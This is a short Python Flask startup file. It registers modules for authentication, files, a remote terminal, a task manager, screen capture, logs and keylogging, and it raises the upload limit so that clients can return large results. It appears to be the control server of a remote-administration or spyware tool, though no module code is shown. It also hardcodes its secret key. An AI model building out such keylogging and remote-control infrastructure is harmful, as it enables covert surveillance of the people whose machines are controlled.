from flask import Flask
import threading
from core import clean_cache_task
import bp_auth, bp_main, bp_file, bp_terminal, bp_taskmgr, bp_screen, bp_log, bp_keylog, bp_entertainment

app = Flask(__name__)
app.secret_key = 'super_secret_gardenia_key'

# 增加客户端发包的解析阈值，防止大量文本返回时（如任务列表、文件列表）被 Flask 丢弃
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 允许最大 50MB 的 Payload

app.register_blueprint(bp_auth.bp)
app.register_blueprint(bp_main.bp)
app.register_blueprint(bp_file.bp)
app.register_blueprint(bp_terminal.bp)
app.register_blueprint(bp_taskmgr.bp)
app.register_blueprint(bp_screen.bp)
app.register_blueprint(bp_log.bp)
app.register_blueprint(bp_keylog.bp)
app.register_blueprint(bp_entertainment.bp)

if __name__ == '__main__':
    threading.Thread(target=clean_cache_task, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, threaded=True)
